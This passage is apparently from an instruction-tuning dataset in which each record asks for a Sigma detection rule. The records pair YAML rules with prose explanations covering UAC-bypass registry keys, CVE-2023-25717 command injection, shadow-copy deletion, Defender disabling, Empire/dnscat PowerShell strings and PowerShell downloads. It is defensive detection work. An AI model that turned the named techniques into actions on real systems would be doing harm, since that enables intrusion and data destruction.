'DisableAntiSpyware'\n            - '\\Microsoft\\Windows Defender'\n        - CommandLine|contains|all:\n            - 'reg add'\n            - 'DisableRestrictedAdmin'\n            - 'CurrentControlSet\\Control\\Lsa'\n    selection_child_wmic_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'process call create'\n    selection_child_wmic_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'delete'\n            - 'shadowcopy'\n    selection_child_vssadmin:\n        CommandLine|contains|all:\n            - 'vssadmin'\n            - 'delete'\n            - 'shadows'\n    selection_child_wbadmin:\n        CommandLine|contains|all:\n            - 'wbadmin'\n            - 'delete'\n            - 'catalog'\n    filter_main:\n        CommandLine|contains|all:\n            - 'download.microsoft.com'\n            - 'manageengine.com'\n            - 'msiexec'\n    condition: all of selection_parent_* and (all of selection_special_child_powershell_* or all of selection_special_child_lsass_* or 1 of selection_child_*) and not filter_main\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "suspicious execution from ManageEngine as seen used by Mint Sandstorm",
      "answer": "In order to detect suspicious execution from ManageEngine as seen used by Mint Sandstorm, you should:\n\nFocus on the creation of processes within Windows operating systems, specifically monitoring the parent processes for instances of ManageEngine applications or the use of Java. You should be vigilant for child processes that involve PowerShell (either powershell.exe or powershell_ise.exe). Additionally, pay attention to PowerShell command lines that include specific keywords indicating potentially malicious activities, such as commands for dumping credentials, manipulating local group memberships, downloading files, executing web requests, handling encoded commands, and various other suspicious activities.\n\nAlso, monitor for the use of command-line tools targeting the Local Security Authority Subsystem Service (LSASS), including use cases that might involve dumping process memory or querying system information, commands initiating external network connections via tools like `wget` or `curl`, and the manipulation of user groups and system configurations through command-line interfaces. This includes adding users to local administrator groups, making unauthorized network configurations, disabling anti-spyware features, deleting shadow copies, and other actions that could undermine system integrity and security.\n\nPay extra attention to commands attempting to modify critical system settings through the Registry Editor, use of WMIC for process creation or deletion, and the utilization of utilities designed for backup management or shadow copy deletion, indicating an attempt to hamper system recovery.\n\nBe wary of false positive indicators and ensure that legitimate administrative activities, especially those involving ManageEngine sites or downloading Microsoft components, are not incorrectly flagged. The detection thresholds outlined are critical due to the potential impact and sophistication of the tactics involved."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62), you should monitor Windows registry event logs for specific activities that indicate manipulation. Look for events where the registry `EventType` is `SetValue`, indicating a modification. Specifically, watch for changes to the registry key that ends with `'Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue'` if they contain details resembling '\\Software\\Classes\\{'. This pattern is often indicative of attempts to bypass User Account Control (UAC) and achieve persistence by manipulating shell open commands typically protected by UAC.\n\nAdditionally, pay attention to modifications of the registry key ending with `'Classes\\ms-settings\\shell\\open\\command\\DelegateExecute'`. Changes to this key are another way attackers attempt to maintain persistence or bypass UAC without triggering standard security alerts.\n\nFurthermore, another critical pointer to manipulation involves monitoring for the setting of the default value in two specific registry keys: `'Classes\\ms-settings\\shell\\open\\command\\(Default)'` and `'Classes\\exefile\\shell\\open\\command\\(Default)'`. The presence of a modification event for these keys, especially when not merely clearing these values (`'(Empty)'`), is a strong indication of an attempt to hijack legitimate Windows functions for malicious purposes such as maintaining persistence or facilitating attacks that circumvent UAC mechanisms.\n\nKeep in mind that while monitoring for these modifications, some events might not signify malicious activities (`Unknown` false positives), and diligence is required to differentiate between benign and malicious modifications. The monitoring of these registry modifications is crucial for defending against sophisticated attack techniques designed to exploit Windows' settings and mechanisms for persistence and UAC bypasses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection1:\n        EventType: SetValue\n        TargetObject|endswith: 'Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue'\n        Details|contains: '\\Software\\Classes\\{'\n    selection2:\n        TargetObject|endswith: 'Classes\\ms-settings\\shell\\open\\command\\DelegateExecute'\n    selection3:\n        EventType: SetValue\n        TargetObject|endswith:\n            - 'Classes\\ms-settings\\shell\\open\\command\\(Default)'\n            - 'Classes\\exefile\\shell\\open\\command\\(Default)'\n    filter_sel3:\n        Details: '(Empty)'\n    condition: selection1 or selection2 or (selection3 and not filter_sel3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection1:\n        EventType: SetValue\n        TargetObject|endswith: 'Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue'\n        Details|contains: '\\Software\\Classes\\{'\n    selection2:\n        TargetObject|endswith: 'Classes\\ms-settings\\shell\\open\\command\\DelegateExecute'\n    selection3:\n        EventType: SetValue\n        TargetObject|endswith:\n            - 'Classes\\ms-settings\\shell\\open\\command\\(Default)'\n            - 'Classes\\exefile\\shell\\open\\command\\(Default)'\n    filter_sel3:\n        Details: '(Empty)'\n    condition: selection1 or selection2 or (selection3 and not filter_sel3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)",
      "answer": "In order to detect the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62), you should monitor Windows registry event logs for specific activities that indicate manipulation. Look for events where the registry `EventType` is `SetValue`, indicating a modification. Specifically, watch for changes to the registry key that ends with `'Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue'` if they contain details resembling '\\Software\\Classes\\{'. This pattern is often indicative of attempts to bypass User Account Control (UAC) and achieve persistence by manipulating shell open commands typically protected by UAC.\n\nAdditionally, pay attention to modifications of the registry key ending with `'Classes\\ms-settings\\shell\\open\\command\\DelegateExecute'`. Changes to this key are another way attackers attempt to maintain persistence or bypass UAC without triggering standard security alerts.\n\nFurthermore, another critical pointer to manipulation involves monitoring for the setting of the default value in two specific registry keys: `'Classes\\ms-settings\\shell\\open\\command\\(Default)'` and `'Classes\\exefile\\shell\\open\\command\\(Default)'`. The presence of a modification event for these keys, especially when not merely clearing these values (`'(Empty)'`), is a strong indication of an attempt to hijack legitimate Windows functions for malicious purposes such as maintaining persistence or facilitating attacks that circumvent UAC mechanisms.\n\nKeep in mind that while monitoring for these modifications, some events might not signify malicious activities (`Unknown` false positives), and diligence is required to differentiate between benign and malicious modifications. The monitoring of these registry modifications is crucial for defending against sophisticated attack techniques designed to exploit Windows' settings and mechanisms for persistence and UAC bypasses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation attempt of CVE-2023-25717 a Remote Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a potential exploitation attempt of CVE-2023-25717, a Remote Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin, you should: Monitor webserver logs for HTTP GET requests that are aimed at the '/forms/doLogin' URI and include 'login_username' and 'password' in their query parameters. Additionally, pay attention to queries containing '$(' or its URL encoded version '%24%28', as these patterns indicate attempts to exploit the CVE-2023-25717 vulnerability by injecting malicious code. It's important to be mindful of potential false positives, such as vulnerability scanners or rare instances where a legitimate password might unintentionally contain the specified characters. Adjusting detection mechanisms by incorporating additional indicators, like executed commands, can help in reducing such false positives. This activity is concerned with identifying high-level cyber threats, specifically involving techniques related to initial access and execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri-query|contains|all:\n            - '/forms/doLogin'\n            - 'login_username'\n            - 'password'\n        cs-uri-query|contains:\n            - '$('\n            - '%24%28' # URL Encode version of \"$(\"\n    condition: selection\nfalsepositives:\n    - Vulnerability scanners\n    - Some rare false positives may occur if the password contains the characters \"$(\". Apply addition indicators such as executed commands to remove FP\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri-query|contains|all:\n            - '/forms/doLogin'\n            - 'login_username'\n            - 'password'\n        cs-uri-query|contains:\n            - '$('\n            - '%24%28' # URL Encode version of \"$(\"\n    condition: selection\nfalsepositives:\n    - Vulnerability scanners\n    - Some rare false positives may occur if the password contains the characters \"$(\". Apply addition indicators such as executed commands to remove FP\nlevel: high\n",
      "question": "potential exploitation attempt of CVE-2023-25717 a Remote Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin",
      "answer": "In order to detect a potential exploitation attempt of CVE-2023-25717, a Remote Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin, you should: Monitor webserver logs for HTTP GET requests that are aimed at the '/forms/doLogin' URI and include 'login_username' and 'password' in their query parameters. Additionally, pay attention to queries containing '$(' or its URL encoded version '%24%28', as these patterns indicate attempts to exploit the CVE-2023-25717 vulnerability by injecting malicious code. It's important to be mindful of potential false positives, such as vulnerability scanners or rare instances where a legitimate password might unintentionally contain the specified characters. Adjusting detection mechanisms by incorporating additional indicators, like executed commands, can help in reducing such false positives. This activity is concerned with identifying high-level cyber threats, specifically involving techniques related to initial access and execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Silence EmpireDNSAgent as described in the Group-IP report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Silence EmpireDNSAgent as described in the Group-IP report, you should: Monitor PowerShell scripts for activities commonly associated with this attack by analyzing script block execution logs on Windows systems. Ensure Script Block Logging is enabled to capture the relevant data. Specifically, look for the simultaneous presence of script text snippets indicative of malign activities. For detection, focus on two main patterns. The first pattern, suggesting PowerShell abuse by an Empire toolkit, includes scripts initiating diagnostic processes, computer shutdown or restart commands, handling execution exceptions, passing command arguments, and closing DNS communication tunnels typically used for command and control (C2) actions. The second pattern, indicative of DNS based communication attempts used by the DNSAgent, involves scripts setting up DNS queries, executing nslookup commands, generating random DNS fields, converting session options, and marking sessions as dead or evaluating session drivers. The detection of these two patterns together in PowerShell script execution suggests a critical level threat, potentially due to the Silence group's EmpireDNSAgent activity. Be mindful that not all detections may be malicious and unknown false positives can occur, requiring further investigation for confirmation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    empire:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'System.Diagnostics.Process'\n            - 'Stop-Computer'\n            - 'Restart-Computer'\n            - 'Exception in execution'\n            - '$cmdargs'\n            - 'Close-Dnscat2Tunnel'\n    dnscat:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'set type=$LookupType`nserver'\n            - '$Command | nslookup 2>&1 | Out-String'\n            - 'New-RandomDNSField'\n            - '[Convert]::ToString($SYNOptions, 16)'\n            - '$Session.Dead = $True'\n            - '$Session[\"Driver\"] -eq'\n    condition: empire and dnscat\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    empire:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'System.Diagnostics.Process'\n            - 'Stop-Computer'\n            - 'Restart-Computer'\n            - 'Exception in execution'\n            - '$cmdargs'\n            - 'Close-Dnscat2Tunnel'\n    dnscat:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'set type=$LookupType`nserver'\n            - '$Command | nslookup 2>&1 | Out-String'\n            - 'New-RandomDNSField'\n            - '[Convert]::ToString($SYNOptions, 16)'\n            - '$Session.Dead = $True'\n            - '$Session[\"Driver\"] -eq'\n    condition: empire and dnscat\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "Silence EmpireDNSAgent as described in the Group-IP report",
      "answer": "In order to detect Silence EmpireDNSAgent as described in the Group-IP report, you should: Monitor PowerShell scripts for activities commonly associated with this attack by analyzing script block execution logs on Windows systems. Ensure Script Block Logging is enabled to capture the relevant data. Specifically, look for the simultaneous presence of script text snippets indicative of malign activities. For detection, focus on two main patterns. The first pattern, suggesting PowerShell abuse by an Empire toolkit, includes scripts initiating diagnostic processes, computer shutdown or restart commands, handling execution exceptions, passing command arguments, and closing DNS communication tunnels typically used for command and control (C2) actions. The second pattern, indicative of DNS based communication attempts used by the DNSAgent, involves scripts setting up DNS queries, executing nslookup commands, generating random DNS fields, converting session options, and marking sessions as dead or evaluating session drivers. The detection of these two patterns together in PowerShell script execution suggests a critical level threat, potentially due to the Silence group's EmpireDNSAgent activity. Be mindful that not all detections may be malicious and unknown false positives can occur, requiring further investigation for confirmation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading using comctl32.dll to obtain system privileges.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading using comctl32.dll to obtain system privileges, you should monitor for the loading of certain images within the Windows operating system. Specifically, look out for events where images are loaded from locations that start with paths indicating they might be related to legitimate Windows system processes, such as 'C:\\Windows\\System32\\logonUI.exe.local\\', 'C:\\Windows\\System32\\werFault.exe.local\\', 'C:\\Windows\\System32\\consent.exe.local\\', 'C:\\Windows\\System32\\narrator.exe.local\\', or 'C:\\windows\\system32\\wermgr.exe.local\\'. Moreover, the detection focus is on identifying when these images are loaded in conjunction with a file ending in '\\comctl32.dll'. This specific DLL, when loaded from these peculiar locations, could signal a technique known as DLL sideloading, which can be exploited by an attacker to escalate privileges on the system. The likelihood of these observations being false positives is considered low, and the severity level is regarded as high. This detection strategy is built with a focus on Windows environments, leveraging the category of image loading events for insights.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\logonUI.exe.local\\'\n            - 'C:\\Windows\\System32\\werFault.exe.local\\'\n            - 'C:\\Windows\\System32\\consent.exe.local\\'\n            - 'C:\\Windows\\System32\\narrator.exe.local\\'\n            - 'C:\\windows\\system32\\wermgr.exe.local\\'\n        ImageLoaded|endswith: '\\comctl32.dll'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\logonUI.exe.local\\'\n            - 'C:\\Windows\\System32\\werFault.exe.local\\'\n            - 'C:\\Windows\\System32\\consent.exe.local\\'\n            - 'C:\\Windows\\System32\\narrator.exe.local\\'\n            - 'C:\\windows\\system32\\wermgr.exe.local\\'\n        ImageLoaded|endswith: '\\comctl32.dll'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential DLL sideloading using comctl32.dll to obtain system privileges",
      "answer": "In order to detect potential DLL sideloading using comctl32.dll to obtain system privileges, you should monitor for the loading of certain images within the Windows operating system. Specifically, look out for events where images are loaded from locations that start with paths indicating they might be related to legitimate Windows system processes, such as 'C:\\Windows\\System32\\logonUI.exe.local\\', 'C:\\Windows\\System32\\werFault.exe.local\\', 'C:\\Windows\\System32\\consent.exe.local\\', 'C:\\Windows\\System32\\narrator.exe.local\\', or 'C:\\windows\\system32\\wermgr.exe.local\\'. Moreover, the detection focus is on identifying when these images are loaded in conjunction with a file ending in '\\comctl32.dll'. This specific DLL, when loaded from these peculiar locations, could signal a technique known as DLL sideloading, which can be exploited by an attacker to escalate privileges on the system. The likelihood of these observations being false positives is considered low, and the severity level is regarded as high. This detection strategy is built with a focus on Windows environments, leveraging the category of image loading events for insights."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious PowerShell download command.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell download command, you should: Monitor windows classic PowerShell start event logs for activity involving the use of `Net.WebClient` within the `HostApplication` field. Specifically, look for instances where PowerShell scripts employ commands like `.DownloadFile(` or `.DownloadString(` to download content from the internet. It is important to consider that legitimate PowerShell scripts may also download content from the internet, which could lead to potential false positives. The detection level for this activity is assessed as medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_classic_start\n    definition: fields have to be extract from event\ndetection:\n    selection_webclient:\n        HostApplication|contains: 'Net.WebClient'\n    selection_download:\n        HostApplication|contains:\n            - '.DownloadFile('\n            - '.DownloadString('\n    condition: all of selection_*\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_classic_start\n    definition: fields have to be extract from event\ndetection:\n    selection_webclient:\n        HostApplication|contains: 'Net.WebClient'\n    selection_download:\n        HostApplication|contains:\n            - '.DownloadFile('\n            - '.DownloadString('\n    condition: all of selection_*\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium\n",
      "question": "suspicious PowerShell download command",
      "answer": "In order to detect suspicious PowerShell download command, you should: Monitor windows classic PowerShell start event logs for activity involving the use of `Net.WebClient` within the `HostApplication` field. Specifically, look for instances where PowerShell scripts employ commands like `.DownloadFile(` or `.DownloadString(` to download content from the internet. It is important to consider that legitimate PowerShell scripts may also download content from the internet, which could lead to potential false positives. The detection level for this activity is assessed as medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting encoded base64 MZ header in the commandline.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect encoded base64 MZ header in the commandline, you should: monitor the creation of processes on Windows systems for command lines that contain specific base64 encoded strings that correlate with the MZ header indicative of executable files. These strings include 'TVqQAAMAAAAEAAAA', 'TVpQAAIAAAAEAA8A', 'TVqAAAEAAAAEABAA', 'TVoAAAAAAAAAAAAA', and 'TVpTAQEAAAAEAAAA'. Given these conditions are met, the activity is considered highly suspicious with a low likelihood of being a false positive, suggesting an attempt to execute potentially malicious code or evade detection mechanisms by disguising executable files.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "encoded base64 MZ header in the commandline",
      "answer": "In order to detect encoded base64 MZ header in the commandline, you should: monitor the creation of processes on Windows systems for command lines that contain specific base64 encoded strings that correlate with the MZ header indicative of executable files. These strings include 'TVqQAAMAAAAEAAAA', 'TVpQAAIAAAAEAA8A', 'TVqAAAEAAAAEABAA', 'TVoAAAAAAAAAAAAA', and 'TVpTAQEAAAAEAAAA'. Given these conditions are met, the activity is considered highly suspicious with a low likelihood of being a false positive, suggesting an attempt to execute potentially malicious code or evade detection mechanisms by disguising executable files."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Focus on monitoring PowerShell activity within Windows environments. Specifically, look for any instances where the process 'SyncAppvPublishingServer.exe' is executed. This process is commonly exploited by attackers to circumvent PowerShell execution restrictions. It is crucial to be aware of legitimate App-V client interactions, as they may also trigger this detection, leading to potential false positives. This detection strategy is rated with a medium level of confidence and has been marked as deprecated, indicating that while it may still be relevant, there may be more current or accurate methods of detection. The associated attacker tactics and techniques include leveraging system utilities to bypass security measures.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        - 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\nstatus: deprecated",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        - 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\nstatus: deprecated",
      "question": "SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
      "answer": "In order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Focus on monitoring PowerShell activity within Windows environments. Specifically, look for any instances where the process 'SyncAppvPublishingServer.exe' is executed. This process is commonly exploited by attackers to circumvent PowerShell execution restrictions. It is crucial to be aware of legitimate App-V client interactions, as they may also trigger this detection, leading to potential false positives. This detection strategy is rated with a medium level of confidence and has been marked as deprecated, indicating that while it may still be relevant, there may be more current or accurate methods of detection. The associated attacker tactics and techniques include leveraging system utilities to bypass security measures."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an user account is locked or suspended..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user account is locked or suspended, you should: Monitor Onelogin event logs for specific event types that indicate such activities have occurred. Focus on Onelogin's events log source, where you'll primarily be looking for three types of events. First, look for events with an event type ID of 532, which signals that an account has been locked via API. Secondly, watch out for events marked with an event type ID of 553, indicating an account was also locked through API interactions. Thirdly, be aware of events with an event type ID of 551, which points towards an account suspension carried out via API.\n\nThese activities might sometimes generate false positives, as the system may legitimately lock or suspend user accounts for various non-malicious reasons. Therefore, the level of threat associated with these detections is considered low. Focus your efforts on examining these specific event IDs in the Onelogin's events logs to effectively identify cases where a user account might be at risk, aligning with associated detection practices linked to account manipulation and abuse of authentication processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: onelogin\n    service: onelogin.events\ndetection:\n    selection1: # Locked via API\n        event_type_id: 532\n    selection2: # Locked via API\n        event_type_id: 553\n    selection3: # Suspended via API\n        event_type_id: 551\n    condition: 1 of selection*\nfalsepositives:\n    - System may lock or suspend user accounts.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: onelogin\n    service: onelogin.events\ndetection:\n    selection1: # Locked via API\n        event_type_id: 532\n    selection2: # Locked via API\n        event_type_id: 553\n    selection3: # Suspended via API\n        event_type_id: 551\n    condition: 1 of selection*\nfalsepositives:\n    - System may lock or suspend user accounts.\nlevel: low\n",
      "question": "when an user account is locked or suspended.",
      "answer": "In order to detect when a user account is locked or suspended, you should: Monitor Onelogin event logs for specific event types that indicate such activities have occurred. Focus on Onelogin's events log source, where you'll primarily be looking for three types of events. First, look for events with an event type ID of 532, which signals that an account has been locked via API. Secondly, watch out for events marked with an event type ID of 553, indicating an account was also locked through API interactions. Thirdly, be aware of events with an event type ID of 551, which points towards an account suspension carried out via API.\n\nThese activities might sometimes generate false positives, as the system may legitimately lock or suspend user accounts for various non-malicious reasons. Therefore, the level of threat associated with these detections is considered low. Focus your efforts on examining these specific event IDs in the Onelogin's events logs to effectively identify cases where a user account might be at risk, aligning with associated detection practices linked to account manipulation and abuse of authentication processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options, and other low-level stuff, you should monitor Windows process creation logs for instances where processes match specific patterns indicating the use of PCHunter. Look for processes that have been created with the image names ending in '\\PCHunter64.exe' or '\\PCHunter32.exe'. Additionally, pay attention to processes that contain certain properties, such as files named 'PCHunter.exe' or those described as 'Epoolsoft Windows Information View Tools'. Moreover, it is critical to scrutinize processes with specific hash values, which include a variety of SHA1, MD5, SHA256, and IMPHASH identifiers such as '5F1CBC3D99558307BC1250D084FA968521482025', '987B65CD9B9F4E9A1AFD8F8B48CF64A7', '2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32', among others listed. These characteristics strongly indicate the execution or manipulation of processes using the PCHunter tool, which can be an essential part of diagnosing or intervening in potentially malicious activity aimed at manipulating system processes or obtaining sensitive information at a low level. It is important to note that false positives are unlikely, indicating that detection of these specific patterns should be treated with high priority and investigated accordingly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image|endswith:\n            - '\\PCHunter64.exe'\n            - '\\PCHunter32.exe'\n    selection_pe:\n        - OriginalFileName: 'PCHunter.exe'\n        - Description: 'Epoolsoft Windows Information View Tools'\n    selection_hashes:\n        Hashes|contains:\n            - 'SHA1=5F1CBC3D99558307BC1250D084FA968521482025'\n            - 'MD5=987B65CD9B9F4E9A1AFD8F8B48CF64A7'\n            - 'SHA256=2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32'\n            - 'IMPHASH=444D210CEA1FF8112F256A4997EED7FF'\n            - 'SHA1=3FB89787CB97D902780DA080545584D97FB1C2EB'\n            - 'MD5=228DD0C2E6287547E26FFBD973A40F14'\n            - 'SHA256=55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C'\n            - 'IMPHASH=0479F44DF47CFA2EF1CCC4416A538663'\n    selection_hash_values:\n        - md5:\n            - '228dd0c2e6287547e26ffbd973a40f14'\n            - '987b65cd9b9f4e9a1afd8f8b48cf64a7'\n        - sha1:\n            - '5f1cbc3d99558307bc1250d084fa968521482025'\n            - '3fb89787cb97d902780da080545584d97fb1c2eb'\n        - sha256:\n            - '2b214bddaab130c274de6204af6dba5aeec7433da99aa950022fa306421a6d32'\n            - '55f041bf4e78e9bfa6d4ee68be40e496ce3a1353e1ca4306598589e19802522c'\n        - Imphash:\n            - '444d210cea1ff8112f256a4997eed7ff'\n            - '0479f44df47cfa2ef1ccc4416a538663'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image|endswith:\n            - '\\PCHunter64.exe'\n            - '\\PCHunter32.exe'\n    selection_pe:\n        - OriginalFileName: 'PCHunter.exe'\n        - Description: 'Epoolsoft Windows Information View Tools'\n    selection_hashes:\n        Hashes|contains:\n            - 'SHA1=5F1CBC3D99558307BC1250D084FA968521482025'\n            - 'MD5=987B65CD9B9F4E9A1AFD8F8B48CF64A7'\n            - 'SHA256=2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32'\n            - 'IMPHASH=444D210CEA1FF8112F256A4997EED7FF'\n            - 'SHA1=3FB89787CB97D902780DA080545584D97FB1C2EB'\n            - 'MD5=228DD0C2E6287547E26FFBD973A40F14'\n            - 'SHA256=55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C'\n            - 'IMPHASH=0479F44DF47CFA2EF1CCC4416A538663'\n    selection_hash_values:\n        - md5:\n            - '228dd0c2e6287547e26ffbd973a40f14'\n            - '987b65cd9b9f4e9a1afd8f8b48cf64a7'\n        - sha1:\n            - '5f1cbc3d99558307bc1250d084fa968521482025'\n            - '3fb89787cb97d902780da080545584d97fb1c2eb'\n        - sha256:\n            - '2b214bddaab130c274de6204af6dba5aeec7433da99aa950022fa306421a6d32'\n            - '55f041bf4e78e9bfa6d4ee68be40e496ce3a1353e1ca4306598589e19802522c'\n        - Imphash:\n            - '444d210cea1ff8112f256a4997eed7ff'\n            - '0479f44df47cfa2ef1ccc4416a538663'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff",
